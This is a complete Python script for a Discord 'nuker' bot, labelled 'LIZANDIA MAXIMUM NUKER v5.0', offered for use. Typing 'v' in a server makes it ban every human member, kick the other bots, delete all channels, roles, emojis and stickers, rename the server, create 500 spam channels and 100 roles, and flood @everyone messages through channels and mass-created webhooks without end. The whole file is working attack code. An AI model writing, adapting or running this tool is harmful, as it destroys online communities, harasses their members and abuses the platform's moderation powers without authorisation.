import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import sys

os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# BANNER
# ============================================
print("""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                       ║
║     ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗                          ║
║     ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗                         ║
║     ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║                         ║
║     ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║                         ║
║     ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║                         ║
║     ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝                         ║
║                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════╗  ║
║                    ║              LIZANDIA MAXIMUM NUKER v5.0                      ║  ║
║                    ║         TYPE 'v' IN ANY CHANNEL TO DESTROY THE SERVER        ║  ║
║                    ║                 FIRST: BAN ALL MEMBERS                       ║  ║
║                    ║                 THEN: TOTAL DESTRUCTION                      ║  ║
║                    ╚═══════════════════════════════════════════════════════════════╝  ║
║                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# TOKEN INPUT
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# ============================================
# LIZANDIA MESSAGES
# ============================================
BAN_REASON = "LIZANDIA TEAM - SERVER DESTRUCTION"

SPAM_MESSAGES = [
    "@everyone **LIZANDIA TEAM DESTROYED THIS SERVER**",
    "```LIZANDIA - LIZANDIA - LIZANDIA```",
    "@everyone **LIZANDIA WAS HERE**",
    "```TEAM LIZANDIA - MAXIMUM DESTRUCTION```",
    "**LIZANDIA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "@everyone **BYE BYE SERVER - LIZANDIA**",
    "```POWERED BY LIZANDIA```",
    "**LIZANDIA TEAM - COMPLETE ANNIHILATION**",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```LIZANDIA DOES NOT FORGIVE```",
    "**GET REKT - LIZANDIA STYLE**",
    "@everyone **LIZANDIA - LIZANDIA - LIZANDIA**"
]

WEBHOOK_NAMES = ["LIZANDIA", "TEAM-LIZANDIA", "LIZANDIA-NUKER", "LIZANDIA-DESTROYER", "LIZANDIA-POWER"]

CHANNEL_NAMES = ["LIZANDIA", "LIZANDIA-TEAM", "LIZANDIA-POWER", "LIZANDIA-HERE", "LIZANDIA-ALGERIA", "LIZANDIA-NUKE"]

# ============================================
# COLORS FOR CONSOLE
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# MAXIMUM NUKE FUNCTION
# ============================================
async def lizandia_nuke(guild, channel):
    """LIZANDIA MAXIMUM NUKE - First ban all, then destroy everything"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] LIZANDIA MAXIMUM NUKE STARTED ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    await channel.send("```🔥 LIZANDIA MAXIMUM NUKE INITIATED 🔥```")
    await channel.send("@everyone **LIZANDIA TEAM HAS ARRIVED**")
    
    start_time = time.time()
    
    # ============================================
    # PHASE 1: BAN ALL MEMBERS (PRIORITY)
    # ============================================
    print(f"{Colors.CYAN}[1/8] BANNING ALL MEMBERS (LIZANDIA PRIORITY)...{Colors.RESET}")
    await channel.send("**🔨 PHASE 1: BANNING ALL MEMBERS - LIZANDIA STYLE**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total_humans = len([m for m in members if not m.bot])
    total_bots = len([m for m in members if m.bot and m.id != bot.user.id])
    banned = 0
    
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason=BAN_REASON, delete_message_days=7)
                banned += 1
                if banned % 30 == 0:
                    print(f"    • LIZANDIA BANNED {banned}/{total_humans} HUMANS")
                    await channel.send(f"**LIZANDIA BANNED {banned}/{total_humans} MEMBERS**")
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ LIZANDIA BANNED {banned} MEMBERS{Colors.RESET}")
    await channel.send(f"**✅ LIZANDIA BANNED {banned} MEMBERS**")
    
    # ============================================
    # PHASE 2: KICK ALL BOTS
    # ============================================
    print(f"{Colors.CYAN}[2/8] REMOVING ALL BOTS (LIZANDIA CLEANSE)...{Colors.RESET}")
    await channel.send("**🤖 PHASE 2: REMOVING ALL BOTS - LIZANDIA CLEANSE**")
    
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason=BAN_REASON)
                bots_kicked += 1
                if bots_kicked % 10 == 0:
                    print(f"    • LIZANDIA REMOVED {bots_kicked}/{total_bots} BOTS")
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ LIZANDIA REMOVED {bots_kicked} BOTS{Colors.RESET}")
    await channel.send(f"**✅ LIZANDIA REMOVED {bots_kicked} BOTS**")
    
    # ============================================
    # PHASE 3: CREATE MASS WEBHOOKS
    # ============================================
    print(f"{Colors.CYAN}[3/8] CREATING 100 LIZANDIA WEBHOOKS...{Colors.RESET}")
    await channel.send("**🪝 PHASE 3: CREATING 100 LIZANDIA WEBHOOKS**")
    
    webhooks = []
    text_channels = list(guild.text_channels)[:20]
    
    for ch in text_channels:
        for i in range(5):
            try:
                webhook = await ch.create_webhook(name=f"LIZANDIA-{i}")
                webhooks.append(webhook)
                await asyncio.sleep(0.05)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ CREATED {len(webhooks)} LIZANDIA WEBHOOKS{Colors.RESET}")
    await channel.send(f"**✅ CREATED {len(webhooks)} LIZANDIA WEBHOOKS**")
    
    # ============================================
    # PHASE 4: DELETE ALL CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[4/8] DELETING ALL CHANNELS...{Colors.RESET}")
    await channel.send("**🗑️ PHASE 4: DELETING ALL CHANNELS - LIZANDIA PURGE**")
    
    channels_deleted = 0
    for ch in guild.channels:
        try:
            await ch.delete(reason=BAN_REASON)
            channels_deleted += 1
            if channels_deleted % 50 == 0:
                print(f"    • DELETED {channels_deleted} CHANNELS")
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ DELETED {channels_deleted} CHANNELS{Colors.RESET}")
    
    # ============================================
    # PHASE 5: DELETE ALL ROLES
    # ============================================
    print(f"{Colors.CYAN}[5/8] DELETING ALL ROLES...{Colors.RESET}")
    
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason=BAN_REASON)
                roles_deleted += 1
                if roles_deleted % 30 == 0:
                    print(f"    • DELETED {roles_deleted} ROLES")
                await asyncio.sleep(0.01)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ DELETED {roles_deleted} ROLES{Colors.RESET}")
    
    # ============================================
    # PHASE 6: DELETE ALL EMOJIS & STICKERS
    # ============================================
    print(f"{Colors.CYAN}[6/8] DELETING ALL EMOJIS & STICKERS...{Colors.RESET}")
    
    emojis_deleted = 0
    for emoji in guild.emojis:
        try:
            await emoji.delete(reason=BAN_REASON)
            emojis_deleted += 1
            await asyncio.sleep(0.01)
        except:
            pass
    
    stickers_deleted = 0
    for sticker in guild.stickers:
        try:
            await sticker.delete(reason=BAN_REASON)
            stickers_deleted += 1
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ DELETED {emojis_deleted} EMOJIS & {stickers_deleted} STICKERS{Colors.RESET}")
    
    # ============================================
    # PHASE 7: RENAME SERVER & CREATE 500 CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[7/8] RENAMING SERVER TO LIZANDIA & CREATING 500 CHANNELS...{Colors.RESET}")
    await channel.send("**📁 PHASE 7: CREATING 500 LIZANDIA CHANNELS**")
    
    new_name = random.choice(["LIZANDIA", "TEAM LIZANDIA", "LIZANDIA-ALGERIA", "LIZANDIA-POWER", "LIZANDIA-DESTROYER"])
    try:
        await guild.edit(name=new_name)
        print(f"    ✓ RENAMED TO: {new_name}")
    except:
        pass
    
    # Create 500 spam channels
    for i in range(500):
        try:
            await guild.create_text_channel(name=f"{random.choice(CHANNEL_NAMES)}-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} LIZANDIA CHANNELS")
                await channel.send(f"**LIZANDIA CREATED {i} CHANNELS**")
            await asyncio.sleep(0.008)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ CREATED 500 LIZANDIA CHANNELS{Colors.RESET}")
    await channel.send("**✅ LIZANDIA CREATED 500 CHANNELS**")
    
    # Create 100 roles
    print(f"{Colors.CYAN}[EXTRA] CREATING 100 LIZANDIA ROLES...{Colors.RESET}")
    for i in range(100):
        try:
            await guild.create_role(name=f"LIZANDIA-{i}", color=discord.Color.red())
            await asyncio.sleep(0.008)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ CREATED 100 LIZANDIA ROLES{Colors.RESET}")
    
    # ============================================
    # PHASE 8: START INFINITE SPAM
    # ============================================
    print(f"{Colors.CYAN}[8/8] STARTING INFINITE LIZANDIA SPAM...{Colors.RESET}")
    await channel.send("**💬 PHASE 8: STARTING INFINITE LIZANDIA SPAM**")
    
    # Channel spam
    async def channel_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.03)
                except:
                    pass
            await asyncio.sleep(0.05)
    
    # Webhook spam
    async def webhook_spam():
        async with aiohttp.ClientSession() as session:
            while True:
                for webhook in webhooks:
                    try:
                        data = {
                            "content": random.choice(SPAM_MESSAGES),
                            "username": random.choice(WEBHOOK_NAMES)
                        }
                        async with session.post(webhook.url, json=data) as resp:
                            pass
                        await asyncio.sleep(0.03)
                    except:
                        pass
                await asyncio.sleep(0.05)
    
    asyncio.create_task(channel_spam())
    asyncio.create_task(webhook_spam())
    
    print(f"{Colors.GREEN}    ✓ LIZANDIA SPAM STARTED ON {len(webhooks)} WEBHOOKS + 500 CHANNELS{Colors.RESET}")
    await channel.send(f"**✅ LIZANDIA SPAM ACTIVE: {len(webhooks)} WEBHOOKS + 500 CHANNELS**")
    
    # ============================================
    # FINISH
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    # Final message
    final_message = f"""```diff
+ ╔═══════════════════════════════════════════════════════════════════════════╗
+ ║                                                                           ║
+ ║                    ██╗     ██╗███████╗ █████╗ ███╗   ██╗██████╗ ██╗ █████╗ ║
+ ║                    ██║     ██║╚══███╔╝██╔══██╗████╗  ██║██╔══██╗██║██╔══██╗║
+ ║                    ██║     ██║  ███╔╝ ███████║██╔██╗ ██║██║  ██║██║███████║║
+ ║                    ██║     ██║ ███╔╝  ██╔══██║██║╚██╗██║██║  ██║██║██╔══██║║
+ ║                    ███████╗██║███████╗██║  ██║██║ ╚████║██████╔╝██║██║  ██║║
+ ║                    ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝║
+ ║                                                                           ║
+ ║                    ╔═══════════════════════════════════════════════════╗  ║
+ ║                    ║         SERVER DESTROYED BY LIZANDIA TEAM         ║  ║
+ ║                    ╚═══════════════════════════════════════════════════╝  ║
+ ║                                                                           ║
+ ║                    STATISTICS:                                           ║
+ ║                    • BANNED: {banned} MEMBERS                              ║
+ ║                    • BOTS REMOVED: {bots_kicked}                           ║
+ ║                    • WEBHOOKS CREATED: {len(webhooks)}                     ║
+ ║                    • CHANNELS DELETED: {channels_deleted}                  ║
+ ║                    • ROLES DELETED: {roles_deleted}                        ║
+ ║                    • EMOJIS DELETED: {emojis_deleted}                      ║
+ ║                    • CHANNELS CREATED: 500                                ║
+ ║                    • ROLES CREATED: 100                                   ║
+ ║                    • TIME: {total_time} SECONDS                            ║
+ ║                                                                           ║
+ ║                    LIZANDIA JAK LMOT RA7 TARJ3 LOT HHHH                  ║
+ ║                                                                           ║
+ ║                    LIZANDIA TEAM - ALGERIA                                ║
+ ║                                                                           ║
+ ╚═══════════════════════════════════════════════════════════════════════════╝
+ 
+ LIZANDIA - LIZANDIA - LIZANDIA - LIZANDIA - LIZANDIA
```"""
    
    for ch in guild.text_channels:
        try:
            await ch.send(final_message)
            break
        except:
            pass
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓] LIZANDIA MAXIMUM NUKE COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • SERVER: {guild.name}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
    print(f"{Colors.GREEN}    • BOTS REMOVED: {bots_kicked}")
    print(f"{Colors.GREEN}    • WEBHOOKS: {len(webhooks)}")
    print(f"{Colors.GREEN}    • CHANNELS: 500 CREATED")
    print(f"{Colors.GREEN}    • ROLES: 100 CREATED")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    print(f"{Colors.BOLD}{Colors.YELLOW}🏆 LIZANDIA TEAM - COMPLETE VICTORY 🏆{Colors.RESET}\n")

# ============================================
# ON MESSAGE - COMMAND 'v'
# ============================================
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.content.lower() == 'v':
        if message.guild:
            # Send confirmation
            await message.channel.send("```🔥 LIZANDIA MAXIMUM NUKE ACTIVATED 🔥```")
            await message.channel.send("@everyone **LIZANDIA TEAM HAS ARRIVED - SERVER WILL BE DESTROYED**")
            
            # Start the nuke
            await lizandia_nuke(message.guild, message.channel)
        else:
            await message.channel.send("❌ This command only works in servers!")
    
    await bot.process_commands(message)

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ LIZANDIA BOT ONLINE: {bot.user.name}{' ' * (28 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀 LIZANDIA MAXIMUM NUKER IS READY                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 TYPE 'v' IN ANY CHANNEL TO DESTROY THE SERVER                 ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💀 FIRST: BAN ALL MEMBERS                                        ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💀 THEN: TOTAL DESTRUCTION + INFINITE SPAM                       ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"\n{Colors.BOLD}{Colors.YELLOW}⚡ LIZANDIA TEAM - TYPE 'v' IN ANY SERVER CHANNEL TO START THE NUKE ⚡{Colors.RESET}\n")

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
